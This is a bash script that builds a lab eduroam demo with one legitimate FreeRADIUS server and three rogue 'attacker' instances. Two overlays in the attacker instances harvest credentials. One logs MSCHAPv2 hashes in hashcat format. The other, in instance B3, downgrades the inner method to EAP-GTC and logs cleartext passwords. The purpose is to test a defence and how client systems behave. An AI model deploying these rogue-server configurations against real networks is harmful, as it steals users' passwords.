#!/usr/bin/env bash
# Builds the three FreeRADIUS instances of the eduroam demo in ~/gecko-radius
# (docs/eduroam-demo.md), each a copy of the stock /etc/freeradius/3.0 with a
# small overlay. Never touches /etc/freeradius itself; re-run it any time to
# rebuild the copies (e.g. after changing this script).
#
#   legit        port 1812  Uni Wipkingen CA cert, pablo + gecko (VLAN 99, 60 s), both realms local
#   attacker-b1  port 1814  Rogue CA cert (scene 2)
#   attacker-b2  port 1816  Uni Wipkingen CA cert for onboard.gecko.ch only (scene 3)
#   attacker-b3  port 1818  Rogue CA cert, offers EAP-GTC first (plaintext-harvest test)
#
# Run inside WSL from the repo: bash lab/eduroam/radius/setup-instances.sh
set -euo pipefail

REPO="$(cd "$(dirname "$0")/../../.." && pwd)"
SECRETS="$REPO/lab-secrets"
BASE="$HOME/gecko-radius"
STOCK=/etc/freeradius/3.0

sudo test -d "$STOCK" || { echo "FreeRADIUS 3 not installed ($STOCK missing)" >&2; exit 1; }
[ -f "$SECRETS/radius/secrets.env" ] || { echo "run lab/eduroam/make-pki.sh first" >&2; exit 1; }
# shellcheck disable=SC1091
. <(tr -d '\r' < "$SECRETS/radius/secrets.env")

build() { # name, cert basename, ca basename, shared secret, authorize file content, auth port
    local name=$1 cert=$2 ca=$3 secret=$4 users=$5 port=$6
    local dir="$BASE/$name"
    sudo rm -rf "$dir"
    sudo cp -a "$STOCK" "$dir"
    sudo chown -R "$USER:" "$dir"
    chmod -R u+rwX "$dir"

    # Runs as root from a user-owned copy: drop the switch to freerad, which
    # couldn't read the copied keys. Lab only.
    sed -i -E 's/^(\s*)(user|group) = freerad/\1# \2 = freerad  (gecko: runs as root, lab only)/' "$dir/radiusd.conf"

    mkdir -p "$dir/gecko-certs"
    cp "$SECRETS/pki/$cert.pem" "$dir/gecko-certs/server.pem"
    cp "$SECRETS/pki/$cert.key" "$dir/gecko-certs/server.key"
    cp "$SECRETS/pki/$ca.pem" "$dir/gecko-certs/ca.pem"
    cp "$SECRETS/pki/dh.pem" "$dir/gecko-certs/dh.pem"
    chmod 600 "$dir/gecko-certs/server.key"

    # Clients: with mirrored WSL networking (Windows 11) the routers send RADIUS
    # straight to the laptop, so FreeRADIUS sees Router A's WAN as the source --
    # accept the lab subnet. On Windows-10 NAT this was 172.16.0.0/12, the WSL
    # gateway behind lab/eduroam/udp-relay.py (see docs/eduroam-decisions.md, D4).
    cat > "$dir/clients.conf" <<EOF
client localhost {
	ipaddr = 127.0.0.1
	secret = testing123
}
client wsl-relay {
	ipaddr = 192.168.137.0/24
	secret = $secret
	require_message_authenticator = yes
}
EOF

    # EAP: PEAP-MSCHAPv2 primary (docs/eduroam-decisions.md, D3), TTLS too.
    rm -f "$dir/mods-enabled/eap"
    cat > "$dir/mods-enabled/eap" <<'EOF'
eap {
	default_eap_type = peap
	timer_expire = 60
	ignore_unknown_eap_types = no
	cisco_accounting_username_bug = no
	max_sessions = ${max_requests}

	tls-config tls-common {
		private_key_file = ${confdir}/gecko-certs/server.key
		certificate_file = ${confdir}/gecko-certs/server.pem
		ca_file = ${confdir}/gecko-certs/ca.pem
		dh_file = ${confdir}/gecko-certs/dh.pem
		cipher_list = "DEFAULT"
		cipher_server_preference = no
		ecdh_curve = "prime256v1"
		tls_min_version = "1.2"
		tls_max_version = "1.2"
		cache {
			enable = no
		}
		verify {
		}
	}

	peap {
		tls = tls-common
		default_eap_type = mschapv2
		copy_request_to_tunnel = no
		use_tunneled_reply = no
		virtual_server = "inner-tunnel"
	}

	ttls {
		tls = tls-common
		default_eap_type = md5
		copy_request_to_tunnel = no
		use_tunneled_reply = no
		virtual_server = "inner-tunnel"
	}

	mschapv2 {
	}

	md5 {
	}

	gtc {
		auth_type = PAP
	}
}
EOF

    # Own ports, so the three instances run side by side: auth on $port, acct
    # on $port+1 (the stock listen sections say 0 = the default 1812/1813),
    # and the inner tunnel's local test listener (stock 18120) moved along.
    # (radiusd -i/-p would be simpler, but it bypasses the "default" virtual server.)
    # Whole listen{} blocks are buffered: in the acct block "port" comes before "type".
    awk -v auth="$port" -v acct="$((port + 1))" '
        function flush() { for (i = 1; i <= n; i++) { l = buf[i]; if (t && l ~ /^[ \t]*port = 0$/) sub(/port = 0/, "port = " t, l); print l }; n = 0; t = "" }
        !depth && /^[ \t]*listen \{/ { depth = 1; n = 0; t = ""; buf[++n] = $0; next }
        depth {
            buf[++n] = $0
            if ($0 ~ /^[ \t]*type = auth/) t = auth
            if ($0 ~ /^[ \t]*type = acct/) t = acct
            o = gsub(/\{/, "{"); c = gsub(/\}/, "}"); depth += o - c
            if (!depth) flush()
            next
        }
        { print }' "$dir/sites-enabled/default" > "$dir/default.tmp" && mv "$dir/default.tmp" "$dir/sites-enabled/default"
    sed -i -E "s/port = 18120/port = $((18120 + port - 1812))/" "$dir/sites-enabled/inner-tunnel"

    # Users are looked up inside the tunnel only, so outer identities never
    # pick up reply attributes of their own.
    sed -i -E 's/^(\t)files$/\1# files  (gecko: users are looked up inside the tunnel only)/' "$dir/sites-enabled/default"
    printf '%s\n' "$users" > "$dir/mods-config/files/authorize"

    # Both realms are handled locally, never proxied. In production only
    # gecko.<sp-domain> would be local; uni-wipkingen.ch would be proxied to the
    # federation (the visitor's home IdP). nostrip: the users file keys on the
    # full user@realm.
    cat >> "$dir/proxy.conf" <<'EOF'

# --- gecko eduroam demo ---
realm gecko.ch {
	nostrip
}
realm uni-wipkingen.ch {
	nostrip
}
EOF
}

mkdir -p "$BASE/logs"

# --- legit ---
LEGIT_USERS=$(cat <<EOF
# Onboarding identity (Design A, phase 1): public credentials, walled-garden
# VLAN 99, at most 60 s. Only accepted when it is the outer identity too
# (policy gecko_inner_check).
fetch@gecko.ch	Cleartext-Password := "gecko"
	Tunnel-Type = VLAN,
	Tunnel-Medium-Type = IEEE-802,
	Tunnel-Private-Group-Id = "99",
	Session-Timeout = 60

# Test account of the home IdP uni-wipkingen.ch (normal access).
pablo@uni-wipkingen.ch	Cleartext-Password := "$TEST_PASSWORD"
EOF
)
build legit radius-service uni-wipkingen-ca "$RADIUS_SECRET_A" "$LEGIT_USERS" 1812

cat > "$BASE/legit/policy.d/gecko" <<'EOF'
# The onboarding identity must be the same outside and inside the tunnel. A
# GECKO outer identity is handled locally and never proxied, so it must never
# carry a real inner identity (that would hand the inner exchange to the SP),
# and the walled garden must not be reachable with a real outer identity.
gecko_inner_check {
	if (&outer.request:User-Name == "fetch@gecko.ch" && &User-Name != "fetch@gecko.ch") {
		reject
	}
	if (&User-Name == "fetch@gecko.ch" && &outer.request:User-Name != "fetch@gecko.ch") {
		reject
	}
}

# Inner reply attributes for the AP (VLAN, session timeout) go to the outer
# Access-Accept via session-state; the stock outer post-auth copies it.
gecko_copy_reply {
	if (&reply:Tunnel-Private-Group-Id) {
		update outer.session-state {
			&Tunnel-Type := &reply:Tunnel-Type
			&Tunnel-Medium-Type := &reply:Tunnel-Medium-Type
			&Tunnel-Private-Group-Id := &reply:Tunnel-Private-Group-Id
		}
	}
	if (&reply:Session-Timeout) {
		update outer.session-state {
			&Session-Timeout := &reply:Session-Timeout
		}
	}
}
EOF
sed -i -E '0,/^authorize \{/s//authorize {\n\tgecko_inner_check/' "$BASE/legit/sites-enabled/inner-tunnel"
sed -i -E '0,/^post-auth \{/s//post-auth {\n\tgecko_copy_reply/' "$BASE/legit/sites-enabled/inner-tunnel"

# --- attackers: accept the public GECKO identity, log everything ---
ATTACKER_USERS='fetch@gecko.ch	Cleartext-Password := "gecko"'
build attacker-b1 radius-rogue rogue-ca "$RADIUS_SECRET_B" "$ATTACKER_USERS" 1814
build attacker-b2 radius-b2 uni-wipkingen-ca "$RADIUS_SECRET_B" "$ATTACKER_USERS" 1816
build attacker-b3 radius-rogue rogue-ca "$RADIUS_SECRET_B" "$ATTACKER_USERS" 1818

# B3 offers EAP-GTC as the PEAP inner method instead of MSCHAPv2. GTC carries the
# typed password in CLEARTEXT inside the tunnel, so a client that lets the server
# downgrade the inner method hands over the plaintext password (no cracking).
# This only tests whether the client PERMITS the downgrade - iOS/Android may
# refuse, silently switch, or warn; that is exactly what we want to observe. The
# MSCHAPv2 block is left in place, so a client that NAKs GTC falls back to
# MSCHAPv2 and its hash is captured instead. With both overlays below, reading
# captured-plain.log vs captured-hashes.log tells us what each OS actually did.
sed -i -E 's/default_eap_type = mschapv2/default_eap_type = gtc/' "$BASE/attacker-b3/mods-enabled/eap"

# --- attacker credential-harvesting overlay (lab only) ----------------------
# Stock FreeRADIUS validates the inner MSCHAPv2 exchange and throws it away; it
# is an authenticator, not a harvester. This overlay makes the two attacker
# instances LOG the inner challenge+response of any identity other than the
# public onboarding one - i.e. a real user who trusted the rogue server
# certificate - to <instance>/captured-hashes.log, in hashcat -m 5500 /asleap
# format. That capture is the HARM the GECKO path prevents: with a GECKO-pinned
# profile the TLS tunnel never completes, so the client never sends a response
# and nothing is ever written here. Read it with extract-hashes.sh.
for atk in attacker-b1 attacker-b2 attacker-b3; do
    adir="$BASE/$atk"
    cat > "$adir/mods-enabled/capture_hash" <<'EOF'
# One NetNTLMv1/MSCHAPv2 line per captured login (lab only).
linelog capture_hash {
	filename = ${confdir}/captured-hashes.log
	permissions = 0644
	format = "%{mschap:User-Name}::::%{mschap:NT-Response}:%{mschap:Challenge}"
}
EOF
    cat > "$adir/policy.d/capture" <<'EOF'
# Capture the inner MSCHAPv2 hash of any identity that is not the public GECKO
# onboarding identity, in the EAP round where the client sends its response.
capture_mschap {
	if (&User-Name != "fetch@gecko.ch" && "%{mschap:NT-Response}") {
		capture_hash
	}
}
EOF
    # Run it in the inner tunnel on both paths. The attacker rejects real users
    # (it cannot complete MSCHAPv2 without the password), but by then the
    # client's response has already arrived, so capture on the reject path too.
    sed -i -E '0,/^post-auth \{/s//post-auth {\n\tcapture_mschap/' "$adir/sites-enabled/inner-tunnel"
    sed -i -E '0,/Post-Auth-Type REJECT \{/s//Post-Auth-Type REJECT {\n\t\tcapture_mschap/' "$adir/sites-enabled/inner-tunnel"
done

# --- attacker B3 cleartext (EAP-GTC) overlay (lab only) ---------------------
# With GTC the inner method is PAP-style: the password arrives as a cleartext
# User-Password inside the tunnel, so the attacker reads it directly - no hash,
# no offline cracking. This logs it to captured-plain.log. It fires only if the
# client actually performed GTC, i.e. accepted the downgrade B3 offers. (If the
# client NAKed GTC and fell back to MSCHAPv2, the hash overlay above caught that
# in captured-hashes.log instead, so the two files together show the OS's choice.)
b3dir="$BASE/attacker-b3"
cat > "$b3dir/mods-enabled/capture_plain" <<'EOF'
# One cleartext line per captured GTC login (lab only).
linelog capture_plain {
	filename = ${confdir}/captured-plain.log
	permissions = 0644
	format = "%{User-Name}:%{User-Password}"
}
EOF
cat > "$b3dir/policy.d/capture_gtc" <<'EOF'
# Capture the cleartext password of any identity that is not the public GECKO
# onboarding identity, whenever a plaintext User-Password is present (GTC/PAP).
capture_gtc {
	if (&User-Name != "fetch@gecko.ch" && "%{User-Password}") {
		capture_plain
	}
}
EOF
# Same two hooks as the hash overlay; both policies coexist (each is a no-op when
# its attribute is absent), so B3 captures GTC cleartext and any MSCHAPv2 fallback.
sed -i -E '0,/^post-auth \{/s//post-auth {\n\tcapture_gtc/' "$b3dir/sites-enabled/inner-tunnel"
sed -i -E '0,/Post-Auth-Type REJECT \{/s//Post-Auth-Type REJECT {\n\t\tcapture_gtc/' "$b3dir/sites-enabled/inner-tunnel"

for name in legit attacker-b1 attacker-b2 attacker-b3; do
    sudo freeradius -C -d "$BASE/$name" >/dev/null 2>&1 \
        && echo "$name: config OK" \
        || { echo "$name: config check FAILED; see: sudo freeradius -XC -d $BASE/$name" >&2; exit 1; }
done
echo "Instances in $BASE. Start one with lab/eduroam/radius/run.sh <legit|attacker-b1|attacker-b2|attacker-b3>"
